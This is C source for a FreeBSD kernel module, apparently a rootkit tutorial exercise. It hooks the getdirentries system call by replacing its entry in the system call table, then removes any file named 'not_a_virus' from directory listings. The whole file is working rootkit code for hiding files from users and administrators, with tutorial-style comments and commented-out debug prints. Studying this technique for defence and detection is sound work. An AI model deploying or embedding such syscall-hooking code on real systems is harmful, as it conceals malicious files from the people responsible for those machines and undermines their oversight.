#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/dirent.h>

#define TARGET_NAME "not_a_virus"
#define LENGTH 11

// System call hook function
//
// Remeber, this function mimics the format of any custom-written system call,
// because it is one.We just don't need to register it like we did in the
// big system call example document, because the whole point is it doesn't
// need to be registered - we're 'registering' it when we redirect the system
// table.
static int dir_hook (struct thread *td, void *syscall_args) {

	struct getdirentries_args *uap;
	uap = (struct getdirentries_args *)syscall_args;

	// We have the old and modified return values:
	struct dirent *curr, *dp;
	// We set up size to match the variable in uap->count (in the original file)
	u_int size, count;

	// Run getdirents and store the data into uap->buf.
	int err = sys_getdirentries(td, uap);
	// This is the actual amount of bytes in the fd.
	size = td->td_retval[0];

	// If this file directory actually contains any information:
	if (size > 0) {
		// Copy the buffer into kernel memory so we can actually use it.
		MALLOC(dp, struct dirent *, size, M_TEMP, M_NOWAIT);
		copyin(uap->buf, dp, size);

		//First direntry struct in the list.
		curr = dp;
		count = size;
		u_int len = 0;
		// Iterate through all directory entries here.
		while (count > 0 && curr->d_reclen != 0) {
			// Reduce count by the size of this direntry.
			len = curr->d_reclen;
			count -= len;

//			uprintf("Current file: %s\n", curr->d_name);
//			uprintf("Current file has size: \n");

			// Do we want to hide the file?
			if (strncmp((char *)&curr->d_name, TARGET_NAME, LENGTH) == 0) {
//				// Only need to cut it out if it's in the
//				// middle of the list. If it's at the end
//				// it'll get cut by the smaller size.
//				uprintf("1\n");
				if (count != 0) {
//					uprintf("2\n");
					bcopy((char *)curr + len,
					      curr, count);
//					uprintf("3\n");
				}
//
				size -= len;
//				uprintf("4\n");
				break;
			}
//			uprintf("5\n");

			// Update curr to point to the next struct if there
			// are more.
			if (count != 0) {
				curr = (struct dirent *) ((char *)curr + len);
			}
		}
		
//		uprintf("6\n");


		// After the loop: if we found something, then this
		// will adjust the return values that the user can see.
		td->td_retval[0] = size;
		copyout(dp, uap->buf, size);
//		uprintf("7\n");
		FREE(dp, M_TEMP);
//		uprintf("8\n");
	}

	return err;
}

// Function called at load/unload
static int load (struct module *module, int cmd, void *arg) {

	int err = 0;

	switch(cmd) {
	case MOD_LOAD:
		uprintf("Loaded module\n");
		sysent[SYS_getdirentries].sy_call = (sy_call_t *)dir_hook;
		break;
	case MOD_UNLOAD:
		sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
		break;
	default:
		err = EOPNOTSUPP;
		break;
	}

	return (err);
}

static moduledata_t read_hook_mod = {
	"read_hook",		// Module name
	load,			// event handler
	NULL			// Extra data
};

DECLARE_MODULE(read_hook, read_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
